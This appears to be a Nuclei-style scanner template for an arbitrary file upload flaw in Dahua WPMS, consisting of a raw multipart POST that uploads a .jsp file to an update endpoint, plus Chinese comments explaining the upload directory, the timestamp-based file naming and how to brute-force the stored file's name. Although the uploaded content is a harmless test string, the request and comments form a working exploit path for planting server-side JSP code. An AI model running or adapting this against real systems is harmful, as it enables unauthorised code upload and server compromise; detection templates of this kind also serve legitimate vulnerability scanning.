id: dahua-wpms-updateOcx-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 大华ocx任意文件上传
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /portal/updateOcx_updateZip.action HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: identity
        Content-Length: 306
        Accept-Language: zh-CN,zh;q=0.8
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
        Connection: keep-alive
        Referer: http://www.baidu.com
        Cache-Control: max-age=0
        Content-Type: multipart/form-data; boundary=9aa1b50e33144fb18837cc97ed863df7

        --9aa1b50e33144fb18837cc97ed863df7
        Content-Disposition: form-data; name="updateBean.compressFileName"

        KgJrYe.jsp
        --9aa1b50e33144fb18837cc97ed863df7
        Content-Disposition: form-data; name="updateBean.compress"; filename="KgJrYe.jsp"
        Content-Type: text/plain

        123
        --9aa1b50e33144fb18837cc97ed863df7-
    matchers:
      - type: word
        part: body
        words:
          - zip
#上传文件位置/portal/ocx/ ，文件命名规则为今天日期精确到秒。时钟是按照 12小时制。例如 16点代表 04 20240805042917+文件名KgJrYe.jsp,
#可以先按照服务器的时间去访问，如果不行就按照服务器的分秒去配对。
#可以先传一个测试文件。然后进行爆破4位。如果没爆破出来就爆破日期后面 6 位。